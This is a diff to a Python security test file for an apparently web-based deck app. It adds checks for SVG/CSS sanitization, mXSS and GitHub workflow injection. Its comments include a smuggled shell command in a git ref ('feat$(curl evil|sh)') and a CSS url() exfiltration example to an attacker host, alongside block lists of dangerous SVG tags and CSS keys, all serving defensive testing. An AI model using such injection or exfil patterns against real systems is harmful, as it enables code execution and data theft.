@@ -91,7 +91,7 @@ def test_unit():
         path = os.path.join(SCRIPTS, script)
         if os.path.exists(path):
             result = subprocess.run(
-                [sys.executable, "-c", f"import py_compile; py_compile.compile('{path}', doraise=True)"],
+                [sys.executable, "-c", f"import py_compile; py_compile.compile({path!r}, doraise=True)"],
                 capture_output=True, text=True
             )
             if result.returncode == 0:
@@ -150,16 +150,35 @@ def test_security():
     else:
         fail("Private URLs", f"found: {found_private}")
 
-    # 4. SVG sanitization present (defense-in-depth)
-    if 'foreignObject' in all_jsx and 'replace(/<foreignObject' in all_jsx:
-        ok("SVG foreignObject sanitization present")
+    # 4. SVG sanitization present (defense-in-depth, DOM-based via sanitizeSvgMarkup)
+    #    v12.54: switched from a SVG_BLOCKED_TAGS blocklist to a SVG_ALLOWED_TAGS
+    #    allowlist mirroring DOMPurify's `svg + svgFilters` profile. Dangerous
+    #    elements (script/foreignObject/use/animate*/iframe/embed/object/link)
+    #    are removed simply because they are not in the allowlist.
+    if 'SVG_ALLOWED_TAGS' in all_jsx and '!SVG_ALLOWED_TAGS.has(tag)' in all_jsx:
+        ok("SVG sanitizer uses allowlist (DOMPurify-style), not blocklist")
     else:
-        fail("SVG foreignObject sanitization")
+        fail("SVG allowlist sanitizer",
+             "sanitizeSvgMarkup must enforce SVG_ALLOWED_TAGS via `!SVG_ALLOWED_TAGS.has(tag)` remove")
 
-    if 'xlink:href' in all_jsx and 'data-blocked-href' in all_jsx:
-        ok("SVG xlink:href sanitization present")
+    #    href/xlink:href scheme filtering inside the DOMParser walk.
+    if 'xlink:href' in all_jsx and "startsWith(\"javascript:\")" in all_jsx:
+        ok("SVG xlink:href / href scheme sanitization present")
     else:
         fail("SVG xlink:href sanitization")
+
+    #    svg BLOCK markup must route through the DOM-based sanitizer (not the old regex chain).
+    if 'sanitizeSvgMarkup(clean.markup' in all_jsx and 'processed = sanitizeSvgMarkup(processed)' in all_jsx:
+        ok("svg block routes markup through sanitizeSvgMarkup (import + render)")
+    else:
+        fail("svg block sanitizeSvgMarkup routing", "svg block must use DOM-based sanitizer at import and render")
+
+    #    href is ALLOWLIST (http/https/mailto/tel + fragment/relative). Blocklist alone
+    #    would let file:/blob:/chrome:/intent: through after browser normalization.
+    if '["http", "https", "mailto", "tel"].includes(m[1].toLowerCase())' in all_jsx:
+        ok("SVG href validation uses scheme allowlist (post-DOMParser)")
+    else:
+        fail("SVG href allowlist", "href scheme check must use an allowlist, not a blocklist")
 
     # 5. sanitizeString strips HTML tags
     if 'replace(/<[^>]*>/g' in all_jsx:
@@ -186,6 +205,584 @@ def test_security():
         ok("sanitizeStudyNotes glossary URL sanitization")
     else:
         fail("sanitizeStudyNotes glossary URL sanitization")
+
+    # 8. SVG_ALLOWED_TAGS allowlist must EXCLUDE the historically-dangerous set
+    #    (the inverse of the old blocklist coverage check). If any of these
+    #    ever creeps back into the allowlist, that's a regression.
+    forbidden_in_allowlist = [
+        "script", "foreignobject", "iframe", "embed", "object", "link",
+        "use",                   # cross-doc reference XSS (Cure53 #283 class)
+        "animate", "animatetransform", "animatemotion", "animatecolor",
+        "set", "mpath", "discard", "cursor",  # SMIL attr-mutation family
+        "handler", "listener",   # legacy scripting hooks
+        # HTML rawtext-on-serialize family (HTML 13.3 step 3.2): even if a future
+        # browser routed these through SVG namespace, text-node escaping rules
+        # differ — keep them out of the allowlist entirely.
+        "xmp", "noembed", "noframes", "noscript", "plaintext", "listing",
+    ]
+    allow = re.search(r'SVG_ALLOWED_TAGS = new Set\(\[([\s\S]*?)\]\)', all_jsx)
+    allow_lower = (allow.group(1).lower() if allow else "")
+    leaked = [t for t in forbidden_in_allowlist if f'"{t}"' in allow_lower]
+    if allow and not leaked:
+        ok("SVG_ALLOWED_TAGS excludes script/foreignObject/use/animate*/iframe/embed/object/link + rawtext family")
+    else:
+        fail("SVG_ALLOWED_TAGS coverage",
+             f"dangerous tags present in allowlist: {leaked or 'allowlist not found'}")
+
+    #    Allowlist must include the legitimate Mermaid/draw.io/Vera diagram surface
+    #    (structural + shapes + filter primitives) so existing decks render.
+    required_in_allowlist = [
+        "svg", "g", "defs", "title", "desc", "marker", "clippath", "mask", "pattern",
+        "circle", "ellipse", "line", "path", "polygon", "polyline", "rect",
+        "text", "tspan", "lineargradient", "radialgradient", "stop", "style",
+        "fegaussianblur", "fecolormatrix", "feblend", "feoffset", "femerge",
+    ]
+    missing_allow = [t for t in required_in_allowlist if f'"{t}"' not in allow_lower]
+    if allow and not missing_allow:
+        ok("SVG_ALLOWED_TAGS includes structural + shape + text + filter primitives")
+    else:
+        fail("SVG_ALLOWED_TAGS coverage", f"missing legitimate elements: {missing_allow}")
+
+    # 8b. SVG <style> CSS-text filter (v12.51): preserve Mermaid/Vera class CSS + url(#fragment)
+    #     paint-server refs, but block @import / external url() / CSS \XX escape bypasses that
+    #     would fire a zero-click exfil beacon on render.
+    if 'function isSvgStyleSafe' in all_jsx and 'isSvgStyleSafe(child.textContent' in all_jsx:
+        ok("SVG <style> CSS-text filtered by isSvgStyleSafe (called from walk)")
+    else:
+        fail("SVG <style> CSS-text filter",
+             "isSvgStyleSafe must exist AND be invoked on <style>.textContent during the SVG walk")
+
+    # 9. sanitizeSvgMarkup strips comment/CDATA/PI nodes — mXSS fix (v12.45)
+    if 'child.nodeType !== 1 && child.nodeType !== 3' in all_jsx:
+        ok("sanitizeSvgMarkup drops comment/CDATA/PI nodes (mXSS)")
+    else:
+        fail("sanitizeSvgMarkup CDATA/comment node strip", "mutation-XSS regression risk")
+
+    # 9a. v12.54: walk MUST descend into <style> so the nodeType filter above
+    # actually runs on CDATA children. The v12.45 fix shipped with a
+    # skip-descend `continue;` after the isSvgStyleSafe check, leaving CDATA
+    # in <style> untouched — that's how the mXSS got through.
+    # Use a brace counter (not a nested-alternation regex) to extract the
+    # branch body — avoids catastrophic backtracking flagged by CodeQL.
+    style_open = re.search(r'if\s*\(\s*tag\s*===\s*"style"\s*\)\s*\{', all_jsx)
+    style_branch_body = ""
+    if style_open:
+        i = style_open.end()
+        depth = 1
+        n = len(all_jsx)
+        while i < n and depth > 0:
+            ch = all_jsx[i]
+            if ch == '{': depth += 1
+            elif ch == '}': depth -= 1
+            i += 1
+        style_branch_body = all_jsx[style_open.end():i - 1]
+    if style_open and 'walk(child)' in style_branch_body:
+        ok("sanitizeSvgMarkup <style> branch descends (v12.54 mXSS fix)")
+    else:
+        fail("sanitizeSvgMarkup <style> walk-descent",
+             "CDATA inside <style> escapes rawtext via dangerouslySetInnerHTML — must call walk(child)")
+
+    # 9b. v12.54: isSvgStyleSafe rejects '<' and ']]>' as defense-in-depth.
+    if re.search(r'isSvgStyleSafe[\s\S]*?css\.indexOf\("<"\)\s*!==\s*-1\s*\)\s*return\s+false', all_jsx) and \
+       re.search(r'isSvgStyleSafe[\s\S]*?css\.indexOf\("\]\]>"\)\s*!==\s*-1\s*\)\s*return\s+false', all_jsx):
+        ok("isSvgStyleSafe rejects '<' and ']]>' (defense-in-depth for rawtext breakout)")
+    else:
+        fail("isSvgStyleSafe rawtext-breakout filters",
+             "must reject '<' and ']]>' so a CDATA/comment slip can't re-enable mXSS")
+
+    # 9b-2. v12.59: close the SVG auto-load exfil class (Vela decks load NOTHING
+    # external). Four structural guards — behaviour is gated functionally by the
+    # jsdom round-trip (9c), these source checks document & pin the mechanism.
+    # (1) isSvgStyleSafe rejects non-url() functions fed a string literal
+    #     (image-set/image/cross-fade/src string sources — the residual bypass).
+    if re.search(r"isSvgStyleSafe[\s\S]*?\[a-z\]\\\[\\w-\\\]\*\\s\*\\\(\\s\*\['\"\]", all_jsx) or \
+       re.search(r"isSvgStyleSafe[\s\S]*?some\(\(m\)\s*=>\s*!/\^url", all_jsx):
+        ok("isSvgStyleSafe rejects string-source CSS functions (image-set/image/cross-fade/src)")
+    else:
+        fail("isSvgStyleSafe string-source function reject",
+             "must reject any non-url() CSS function fed a quoted string (image-set bypass)")
+    # (2) presentation/style attributes routed through the same filter.
+    if 'SVG_URL_REF_ATTRS' in all_jsx and 'SVG_URL_REF_ATTRS.has(name) && !isSvgStyleSafe(a.value)' in all_jsx:
+        ok("SVG presentation/style attrs filtered via SVG_URL_REF_ATTRS + isSvgStyleSafe")
+    else:
+        fail("SVG presentation-attr URL filter",
+             "fill/filter/mask/marker/clip-path/cursor/style values must pass isSvgStyleSafe")
+    # (3) non-anchor href/xlink:href is #fragment-only; <a> keeps the scheme allowlist.
+    if 'name === "href" && tag === "a"' in all_jsx:
+        ok("SVG href policy split: <a> click-nav allowlist vs #fragment-only auto-load refs")
+    else:
+        fail("SVG non-anchor href fragment-only",
+             "feImage/image/use href must be #fragment-only; only <a> may carry http/https")
+    # (4) image-block src restricted to inline data:image/* (no network).
+    if re.search(r'sanitizeUrl\(clean\.src,\s*\["data:"\]\)', all_jsx) and 'data:image/' in all_jsx:
+        ok("image-block src restricted to inline data:image/* (no network)")
+    else:
+        fail("image-block src data:image-only",
+             "image src must be inline data:image/* — http/https auto-load beacon otherwise")
+    # (5) v12.62: SVG sanitizer strips src/srcset (inert in SVG, but <image>
+    #     HTML-aliases to a fetching <img> when the output is re-parsed as HTML)
+    #     AND keeps the output SVG-scoped so HTML-aliasing can't occur at the sink.
+    #     Behaviour is gated functionally by the jsdom round-trip (9c).
+    if re.search(r'name === "src" \|\| name === "srcset"', all_jsx):
+        ok("SVG sanitizer strips src/srcset (HTML-alias <image>->fetching <img> beacon)")
+    else:
+        fail("SVG src/srcset strip",
+             "src/srcset must be stripped — bare <image src> HTML-aliases to a zero-click <img> fetch")
+    if 'top[0].localName' in all_jsx and 'top[0].outerHTML' in all_jsx and 'root.outerHTML' in all_jsx:
+        ok("SVG sanitizer output kept SVG-scoped (no HTML-insertion-mode re-parse at the sink)")
+    else:
+        fail("SVG output SVG-scoping",
+             "sanitizeSvgMarkup must return an SVG-scoped string so <image> etc. cannot HTML-alias at the dangerouslySetInnerHTML sink")
+
+    # 9c. v12.54: CI-gated functional round-trip via jsdom — the source-only
+    # checks above gave false confidence in v12.53 because the right code
+    # was present but unreachable inside <style>. This script actually
+    # runs the sanitizer and asserts no live handler materializes.
+    mxss_script = os.path.join(REPO_ROOT, "tests", "test_svg_mxss.cjs")
+    if os.path.exists(mxss_script):
+        env = os.environ.copy()
+        # CI installs jsdom at the repo root; local dev may have it in /tmp.
+        env["NODE_PATH"] = os.pathsep.join(filter(None, [
+            env.get("NODE_PATH", ""),
+            os.path.join(REPO_ROOT, "node_modules"),
+            "/tmp/node_modules",
+        ]))
+        try:
+            r = subprocess.run(
+                ["node", mxss_script],
+                capture_output=True, text=True, timeout=60, env=env,
+            )
+            if r.returncode == 0:
+                # Last summary line: "  N passed, 0 failed"
+                m = re.search(r'(\d+)\s+passed,\s+(\d+)\s+failed', r.stdout)
+                count = m.group(1) if m else "?"
+                ok(f"SVG mXSS jsdom round-trip suite ({count} payloads)")
+            else:
+                fail("SVG mXSS jsdom round-trip suite",
+                     f"node tests/test_svg_mxss.cjs exited {r.returncode}\n{r.stdout}\n{r.stderr}")
+        except FileNotFoundError:
+            fail("SVG mXSS jsdom round-trip suite", "node not on PATH")
+        except subprocess.TimeoutExpired:
+            fail("SVG mXSS jsdom round-trip suite", "timeout after 60s")
+    else:
+        fail("SVG mXSS jsdom round-trip suite", f"missing: {mxss_script}")
+
+    # 9b. Inline data: image sanitization — sanitizeImageDataUri (v12.63).
+    # data:image/svg+xml is live SVG reaching <img src>; this asserts it is
+    # routed through sanitizeSvgMarkup and non-image data: types are dropped.
+    dimg_script = os.path.join(REPO_ROOT, "tests", "test_data_image_uri.cjs")
+    if os.path.exists(dimg_script):
+        env = os.environ.copy()
+        env["NODE_PATH"] = os.pathsep.join(filter(None, [
+            env.get("NODE_PATH", ""),
+            os.path.join(REPO_ROOT, "node_modules"),
+            "/tmp/node_modules",
+        ]))
+        try:
+            r = subprocess.run(
+                ["node", dimg_script],
+                capture_output=True, text=True, timeout=60, env=env,
+            )
+            if r.returncode == 0:
+                m = re.search(r'(\d+)\s+passed,\s+(\d+)\s+failed', r.stdout)
+                count = m.group(1) if m else "?"
+                ok(f"data: image sanitization suite ({count} cases)")
+            else:
+                fail("data: image sanitization suite",
+                     f"node tests/test_data_image_uri.cjs exited {r.returncode}\n{r.stdout}\n{r.stderr}")
+        except FileNotFoundError:
+            fail("data: image sanitization suite", "node not on PATH")
+        except subprocess.TimeoutExpired:
+            fail("data: image sanitization suite", "timeout after 60s")
+    else:
+        fail("data: image sanitization suite", f"missing: {dimg_script}")
+
+    # 9c. guidelines control/bidi strip (v12.64) — behavioral: pull the exact
+    # char-class the importer applies and run a sample through it. Removing the
+    # strip (or omitting bidi/zero-width) fails this check (red).
+    gm = re.search(r'raw\.guidelines\.replace\(/\[([^\]]*)\]/g, ""\)', all_jsx)
+    if gm:
+        strip = re.compile("[" + gm.group(1) + "]")
+        sample = "keep\nthis" + chr(0x00) + "bad" + chr(0x202e) + "spoof" + chr(0x200b) + "zw text"
+        cleaned = strip.sub("", sample)
+        removed = all(chr(cp) not in cleaned for cp in (0x00, 0x202e, 0x200b))
+        kept = "\n" in cleaned and "keep" in cleaned and "text" in cleaned
+        if removed and kept:
+            ok("guidelines strip removes control/bidi/zero-width, keeps newlines/text")
+        else:
+            fail("guidelines control-char strip behavior", f"cleaned={cleaned!r}")
+    else:
+        fail("guidelines control-char strip", "strip regex absent — prompt-injection scaffolding chars not removed")
+
+    # 10. scheme check strips ASCII control/whitespace before matching (entity/whitespace bypass) (v12.44/45)
+    if 'replace(/[\\u0000-\\u0020]+/g, "").toLowerCase()' in all_jsx:
+        ok("SVG scheme check strips control/whitespace before scheme match")
+    else:
+        fail("SVG scheme normalization", "java\\tscript: / control-char bypass risk")
+
+    # 11. Deck lane limit CLAMPS rather than throws — fail-open sanitizer off-switch fix (v12.47)
+    if 'raw.lanes.slice(0, 50)' in all_jsx:
+        ok("validateAndSanitizeDeck clamps lanes (slice) instead of throwing")
+    else:
+        fail("deck lane clamp", "lane count must clamp, not throw (fail-open trigger)")
+    if 'lanes.length > 50) throw' in all_jsx or 'lanes.length>50)throw' in all_jsx.replace(" ", ""):
+        fail("deck lane limit throws", "throwing on >50 lanes is weaponizable via fail-open callers")
+    else:
+        ok("validateAndSanitizeDeck does not throw on lane count")
+
+    # 12. Deck load callers fail CLOSED — no raw/unsanitized dispatch on sanitize failure (v12.47)
+    failopen = [p for p in ('payload: STARTUP_PATCH', 'payload: deck }', 'payload: result }') if p in all_jsx]
+    if not failopen:
+        ok("deck load fallbacks fail closed (no raw LOAD on catch)")
+    else:
+        fail("fail-open deck load", f"raw unsanitized LOAD still present: {failopen}")
+
+    # 13. IMPORT_CONCEPTS sanitizes pasted slides (bypassed validateAndSanitizeDeck) (v12.47)
+    if 'c.slides.slice(0, 100).map(sanitizeSlide)' in all_jsx:
+        ok("IMPORT_CONCEPTS sanitizes slides via sanitizeSlide")
+    else:
+        fail("IMPORT_CONCEPTS sanitization", "pasted concepts must route slides through sanitizeSlide")
+
+    # 14. Link sinks: item-level links sanitized at import + safe window.open helper, no raw window.open(<deck link>) (v12.46)
+    if 'function openExternalLink' in all_jsx and 'window.open(safe' in all_jsx:
+        ok("openExternalLink helper re-sanitizes URLs at the window.open sink")
+    else:
+        fail("openExternalLink sink helper missing")
+    if re.search(r'window\.open\((?:link|cellLink|b\.link)\b', all_jsx):
+        fail("raw window.open of deck link", "deck-supplied links must go through openExternalLink")
+    else:
+        ok("no raw window.open() of deck-supplied links")
+    if 'if (c.link) c.link = sanitizeUrl(c.link)' in all_jsx:
+        ok("item-level link fields sanitized in sanitizeBlock")
+    else:
+        fail("item-level link sanitization", "icon-row/flow/etc. item links must be sanitizeUrl'd")
+
+
+def test_css_color_exfil():
+    """v12.61: close the CSS auto-load exfil channel on the slide/block color
+    scalar surface (bg/bgGradient/color/accent, per-block *Bg/*Color, grid
+    cell.bg, branding footerBg/accentColor). These feed inline CSS directly and
+    previously bypassed sanitizeStyle. Source guards pin the wiring; the jsdom-free
+    behavioral round-trip (test_css_exfil.cjs) executes the real predicate."""
+    print("\n🎨 CSS color/background exfil (v12.61)")
+    imports = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()
+
+    # (1) one canonical filter — no duplicate reject regex that could drift.
+    if "CSS_LOAD_REJECT" not in imports:
+        ok("single canonical CSS reject filter (no duplicate CSS_LOAD_REJECT)")
+    else:
+        fail("duplicate CSS reject regex", "fold CSS_LOAD_REJECT into STYLE_VALUE_REJECT")
+
+    # (2) STYLE_VALUE_REJECT is function-name-agnostic (catches image()/cross-fade()/
+    #     src(), not just image-set()) — the v12.59 bypass class, on this surface too.
+    rej = re.search(r'STYLE_VALUE_REJECT\s*=\s*/([^\n]+?)/[a-z]*;', imports)
+    if rej and "[a-z]" in rej.group(1) and "['\"]" in rej.group(1):
+        ok("STYLE_VALUE_REJECT rejects any string-source CSS function (name-agnostic)")
+    else:
+        fail("STYLE_VALUE_REJECT name-agnostic", "must reject `funcname('...')`, not only image-set(")
+
+    # (2b) v12.66: both CSS value filters reject the CSS-comment token-splitting
+    #      primitive (`funcname(/**/"…")` / `url/**/(…)`). CSS allows a comment —
+    #      not just whitespace — between a function name and its '('/quoted arg, so
+    #      without this a string-source URL slips past the fnStr/`://` checks. The
+    #      behavioral round-trip (test_css_exfil.cjs §5/§7) executes the predicate.
+    if rej and r"\/\*" in rej.group(1):
+        ok("STYLE_VALUE_REJECT rejects CSS comments (token-splitting exfil)")
+    else:
+        fail("STYLE_VALUE_REJECT comment reject", r"must include \/\* so `image-set(/**/\"…\")` can't split the token")
+    if re.search(r'isSvgStyleSafe[\s\S]*?css\.indexOf\("/\*"\)\s*!==\s*-1\s*\)\s*return\s+false', imports):
+        ok("isSvgStyleSafe rejects CSS comments (token-splitting exfil)")
+    else:
+        fail("isSvgStyleSafe comment reject", 'must reject css.indexOf("/*") so the SVG <style> surface matches')
+
+    # (3) scrubColorFields exists and is wired into both sanitize entry points.
+    if "function scrubColorFields(" in imports:
+        ok("scrubColorFields helper defined")
+    else:
+        fail("scrubColorFields missing", "color scalars need a shared scrub helper")
+    sslide = imports[imports.index("function sanitizeSlide("):imports.index("function sanitizeItem(")] if "function sanitizeSlide(" in imports else ""
+    if "scrubColorFields(clean)" in sslide:
+        ok("sanitizeSlide scrubs slide color scalars (bg/bgGradient/color/accent)")
+    else:
+        fail("sanitizeSlide color scrub", "slide bg/bgGradient/color must be scrubbed")
+    sblock = imports[imports.index("function sanitizeBlock("):imports.index("const VALID_COMMENT_STATUSES")] if "function sanitizeBlock(" in imports else ""
+    if "scrubColorFields(clean)" in sblock and "scrubColorFields(it)" in sblock:
+        ok("sanitizeBlock scrubs block + item/cell color scalars")
+    else:
+        fail("sanitizeBlock color scrub", "block + items (grid cell.bg/dotColor/…) must be scrubbed")
+
+    # (4) slide bgImage (a background *image*) clamped to inline data:image/* — no network.
+    if 'sanitizeUrl(clean.bgImage, ["data:"])' in imports and 'clean.bgImage = s' in imports \
+       and 'data:image' in sslide:
+        ok("slide bgImage restricted to inline data:image/* (no network)")
+    else:
+        fail("bgImage data:image-only", "bgImage must clamp to data:image/* like the image block")
+
+    # (5) branding color scalars routed through the scrub (sanitizeString alone passes a short url()).
+    if 'scrubColorFields(importedBranding)' in imports:
+        ok("branding accentColor/footerBg/footerColor scrubbed")
+    else:
+        fail("branding color scrub", "footerBg/accentColor pass a short url() through sanitizeString")
+
+    # (5b) v12.67: the in-app write paths that bypass import sanitization must sanitize too.
+    #      SET_BRANDING scrubs branding color scalars. The slide-mutating actions
+    #      (UPDATE_SLIDE patch merge, ADD_SLIDE, INSERT_SLIDE, SET_SLIDES) run the full
+    #      sanitizeSlide — a color-only scrub would miss style objects, bgImage, and image
+    #      src; the new-slide / startup-patch paths were otherwise uncovered.
+    reducer = open(os.path.join(PARTS_DIR, "part-reducer.jsx"), encoding="utf-8").read()
+    setb = reducer[reducer.index('case "SET_BRANDING"'):reducer.index('case "SET_GUIDELINES"')] if 'case "SET_BRANDING"' in reducer else ""
+    if "scrubColorFields(b)" in setb:
+        ok("SET_BRANDING scrubs the merged branding (footerBg/accentColor)")
+    else:
+        fail("SET_BRANDING color scrub", "branding dispatch must scrub color scalars")
+    # Each slide-mutating action must funnel its incoming slide(s) through sanitizeSlide
+    # (covers style objects + bgImage data: clamp + image src + svg markup + color scrub).
+    for action, end in [('case "SET_SLIDES"', 'case "ADD_SLIDE"'),
+                        ('case "ADD_SLIDE"', 'case "INSERT_SLIDE"'),
+                        ('case "INSERT_SLIDE"', 'case "UPDATE_SLIDE"'),
+                        ('case "UPDATE_SLIDE"', 'case "REMOVE_SLIDE"')]:
+        seg = reducer[reducer.index(action):reducer.index(end)] if action in reducer and end in reducer else ""
+        name = action.split('"')[1]
+        if "sanitizeSlide" in seg:  # called directly or passed as a .map callback
+            ok(f"{name} sanitizes incoming slide(s) via sanitizeSlide (full render-sink coverage)")
+        else:
+            fail(f"{name} sanitize", f"{name} must route incoming slide(s) through sanitizeSlide")
+
+    # (5c) v12.67: dormant item-insert actions that carry a slides payload must sanitize it,
+    #      so a future caller can't reintroduce the channel; IMPORT_CONCEPTS already did.
+    for action, end in [('case "ADD_ITEM"', 'case "IMPORT_CONCEPTS"'),
+                        ('case "BATCH_ADD"', 'case "REMOVE_ITEM"')]:
+        seg = reducer[reducer.index(action):reducer.index(end)] if action in reducer and end in reducer else ""
+        name = action.split('"')[1]
+        if "sanitizeSlide" in seg:
+            ok(f"{name} sanitizes its slides payload (dormant-path defense-in-depth)")
+        else:
+            fail(f"{name} slides sanitize", f"{name} must map its slides payload through sanitizeSlide")
+
+    # (5d) v12.67: the local live-sync LOAD must take branding from the sanitized copy,
+    #      not the raw incoming deck (slide content was already sanitized; branding was missed).
+    appjs = open(os.path.join(PARTS_DIR, "part-app.jsx"), encoding="utf-8").read()
+    if "...sanitized.branding" in appjs and "...deck.branding }" not in appjs:
+        ok("local live-sync LOAD uses sanitized.branding (not raw deck.branding)")
+    else:
+        fail("local-sync branding", "live-sync payload must spread sanitized.branding, not raw deck.branding")
+
+    # (6) behavioral round-trip — runs the real extracted predicate against PoC values.
+    css_script = os.path.join(REPO_ROOT, "tests", "test_css_exfil.cjs")
+    if os.path.exists(css_script):
+        try:
+            r = subprocess.run(["node", css_script], capture_output=True, text=True, timeout=60)
+            if r.returncode == 0:
+                m = re.search(r'(\d+)\s+passed,\s+(\d+)\s+failed', r.stdout)
+                ok(f"CSS exfil behavioral round-trip ({m.group(1) if m else '?'} checks)")
+            else:
+                fail("CSS exfil behavioral round-trip",
+                     f"node tests/test_css_exfil.cjs exited {r.returncode}\n{r.stdout}\n{r.stderr}")
+        except FileNotFoundError:
+            fail("CSS exfil behavioral round-trip", "node not on PATH")
+        except subprocess.TimeoutExpired:
+            fail("CSS exfil behavioral round-trip", "timeout after 60s")
+    else:
+        fail("CSS exfil behavioral round-trip", f"missing: {css_script}")
+
+
+# ━━━ Audit 2025-05 hardening fixes (CRITICAL/HIGH from security audit) ━
+# Covers: shell-injection in release-preview workflow (C1), github-script
+# JS-injection via test stdout (C2), LOAD_LANES sanitization (H1),
+# block.style CSS-key allowlist (H2), ReAct loop caps (H5).
+
+def test_audit_2025_05_fixes():
+    print("\n── Audit 2025-05 Hardening Fixes ──")
+    workflows = os.path.join(REPO_ROOT, ".github", "workflows")
+    rp_path = os.path.join(workflows, "release-preview.yml")
+    ci_path = os.path.join(workflows, "ci.yml")
+    reducer = open(os.path.join(PARTS_DIR, "part-reducer.jsx"), encoding="utf-8").read()
+    imports = open(os.path.join(PARTS_DIR, "part-imports.jsx"), encoding="utf-8").read()
+    engine  = open(os.path.join(PARTS_DIR, "part-engine.jsx"), encoding="utf-8").read()
+
+    # ── C1: release-preview.yml must not interpolate inputs.pr_ref into a
+    #        `run:` shell command. The branch name is attacker-controlled
+    #        (`feat$(curl evil|sh)` is a valid git ref) and the job holds
+    #        id-token: write + attestations: write.
+    if os.path.exists(rp_path):
+        rp_lines = open(rp_path, encoding="utf-8").read().splitlines()
+        # Walk: when we see `run: |`, record its indent; the block ends at
+        # the next non-blank line with indent <= the run's. Inside the
+        # block, any `${{ inputs.pr_ref }}` is shell injection.
+        in_run = False
+        run_indent = -1
+        offenders = []
+        for line in rp_lines:
+            indent = len(line) - len(line.lstrip())
+            if in_run:
+                if line.strip() and indent <= run_indent:
+                    in_run = False
+                elif "${{ inputs.pr_ref }}" in line or "${{inputs.pr_ref}}" in line:
+                    offenders.append(line.strip())
+            if not in_run and re.match(r'^\s*run:\s*\|\s*$', line):
+                in_run = True
+                run_indent = indent
+        if offenders:
+            fail("C1 release-preview.yml shell-injection",
+                 f"{len(offenders)} run-block uses of inputs.pr_ref — use env: + \"$PR_REF\"")
+        else:
+            ok("C1 release-preview.yml does not shell-interpolate inputs.pr_ref")
+    else:
+        fail("C1 release-preview.yml not found", rp_path)
+
+    # ── C2: ci.yml must not interpolate step outputs into github-script JS
+    #        via `${{ steps.X.outputs.output }}` inside JS template-literals.
+    #        Test stdout is attacker-controlled (PR can add fixtures whose
+    #        names contain backticks). Use env: + process.env instead.
+    if os.path.exists(ci_path):
+        ci_lines = open(ci_path, encoding="utf-8").read().splitlines()
+        # The unsafe pattern is `${{ steps.X.outputs.output }}` interpolated
+        # inside a github-script body (the `script: |` block) — that inlines
+        # attacker-controlled stdout into the JS source. The same expression
+        # inside an `env:` mapping is safe (it becomes process.env.X at
+        # runtime). Walk and only flag occurrences inside a `script: |` block.
+        in_script = False
+        script_indent = -1
+        offenders = []
+        for line in ci_lines:
+            indent = len(line) - len(line.lstrip())
+            if in_script:
+                if line.strip() and indent <= script_indent:
+                    in_script = False
+                elif re.search(r'\$\{\{\s*steps\.\w+\.outputs\.output\s*\}\}', line):
+                    offenders.append(line.strip())
+            if not in_script and re.match(r'^\s*script:\s*\|\s*$', line):
+                in_script = True
+                script_indent = indent
+        if offenders:
+            fail("C2 ci.yml github-script test-output interpolation",
+                 f"{len(offenders)} script-block uses of steps.*.outputs.output — use env: mapping")
+        else:
+            ok("C2 ci.yml does not interpolate step stdout into github-script JS")
+    else:
+        fail("C2 ci.yml not found", ci_path)
+
+    # ── H1: LOAD_LANES reducer case must sanitize lanes — Vera ReAct tool
+    #        writes (`set_slides`, `add_slide`, `edit_slide`) round-trip
+    #        through LOAD_LANES, the only ingest path that previously skipped
+    #        sanitizeSlide.
+    # Extract LOAD_LANES case body (handles both one-line and multi-line forms).
+    m = re.search(r'case "LOAD_LANES":\s*(.+?)(?=\n\s*case "|\n\s*default:)', reducer, re.DOTALL)
+    if m and "sanitizeSlide" in m.group(1):
+        ok("H1 LOAD_LANES reducer routes lanes through sanitizeSlide")
+    else:
+        fail("H1 LOAD_LANES sanitization",
+             "LOAD_LANES must map lanes→items→slides through sanitizeSlide")
+
+    # ── H2: sanitizeBlock must allowlist CSS keys in block.style — the
+    #        previous typecheck-only guard permitted `backgroundImage:
+    #        url(https://attacker/?d=...)` as a zero-click exfil channel.
+    if "SAFE_STYLE_KEYS" in imports:
+        ok("H2 SAFE_STYLE_KEYS allowlist defined")
+    else:
+        fail("H2 SAFE_STYLE_KEYS allowlist missing",
+             "block.style must be filtered through an allowlist of safe CSS keys")
+    if "sanitizeStyle" in imports:
+        ok("H2 sanitizeStyle helper defined")
+    else:
+        fail("H2 sanitizeStyle helper missing")
+    # Dangerous CSS values (url(), expression(), <, javascript:) must be
+    # rejected even when the key is allowlisted (e.g. a future addition
+    # could expose content: which accepts url()). Assert the real mechanism
+    # — the STYLE_VALUE_REJECT regex and its use in the style sanitizer —
+    # rather than proximity to prose, so changelog wording can't affect it.
+    reject_def = re.search(r'STYLE_VALUE_REJECT\s*=\s*/([^/]+)/', imports)
+    if reject_def and 'url' in reject_def.group(1) and 'STYLE_VALUE_REJECT.test(' in imports:
+        ok("H2 sanitizeStyle rejects values containing url( (via STYLE_VALUE_REJECT)")
+    else:
+        fail("H2 sanitizeStyle url() guard",
+             "must reject any value containing url( to prevent CSS exfil")
+    # Image-loading CSS keys (background-image et al.) must NOT be in the
+    # allowlist — they are the primary exfil vector.
+    m = re.search(r'SAFE_STYLE_KEYS\s*=\s*new Set\(\[([^\]]+)\]', imports)
+    if m:
+        # Parse out individually quoted entries so we match whole keys, not
+        # substrings (avoids "justifyContent" matching the substring "content").
+        keys = set(re.findall(r'"([^"]+)"', m.group(1)))
+        keys_lower = {k.lower() for k in keys}
+        forbidden = {"backgroundimage", "background", "borderimage",
+                     "liststyleimage", "liststyle", "cursor", "content",
+                     "mask", "webkitmask", "filter", "font", "src",
+                     "clippath"}
+        leaked = sorted(forbidden & keys_lower)
+        if not leaked:
+            ok("H2 SAFE_STYLE_KEYS excludes image-loading keys")
+        else:
+            fail("H2 SAFE_STYLE_KEYS leaks exfil keys", f"contains: {leaked}")
+    # And the block-level style filter must invoke sanitizeStyle, not just
+    # typecheck. Either pattern is fine: direct assignment from sanitizeStyle,
+    # or `const s = sanitizeStyle(clean.style)` followed by `clean.style = s`.
+    if re.search(r'sanitizeStyle\(\s*clean\.style\s*\)', imports):
+        ok("H2 sanitizeBlock routes clean.style through sanitizeStyle")
+    else:
+        fail("H2 sanitizeBlock style routing",
+             "clean.style must pass through sanitizeStyle()")
+
+    # ── H5: ReAct loop must cap tool-calls per turn and total messages size
+    #        to prevent cost-amplification DoS. Previously only iteration
+    #        count (12) was capped; tool_calls per iter was unbounded.
+    if "MAX_TOOLS_PER_TURN" in engine:
+        ok("H5 MAX_TOOLS_PER_TURN cap defined")
+    else:
+        fail("H5 MAX_TOOLS_PER_TURN missing",
+             "ReAct loop needs a per-turn tool-call cap")
+    if "MAX_TOTAL_TOOLS" in engine:
